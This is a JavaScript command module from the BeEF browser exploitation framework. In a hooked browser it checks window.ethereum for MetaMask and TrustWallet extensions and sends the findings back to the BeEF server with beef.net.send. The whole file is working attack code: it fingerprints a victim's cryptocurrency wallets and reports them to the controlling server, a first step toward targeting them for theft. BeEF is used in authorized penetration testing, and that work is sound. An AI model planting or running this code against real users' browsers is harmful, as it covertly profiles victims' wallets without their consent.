//
// Copyright (c) 2006-2022 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var result = {metaMask: false, trustWallet: false};

	if (typeof window.ethereum !== 'undefined') {
		if(window.ethereum.isMetaMask) {
			console.log('MetaMask is installed!');
			result.metaMask = true;
		}
		if(window.ethereum.isTrust) {
			console.log('TrustWallet is installed!');
			result.trustWallet = true
		}
	}

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "wallet="+JSON.stringify(result));

});

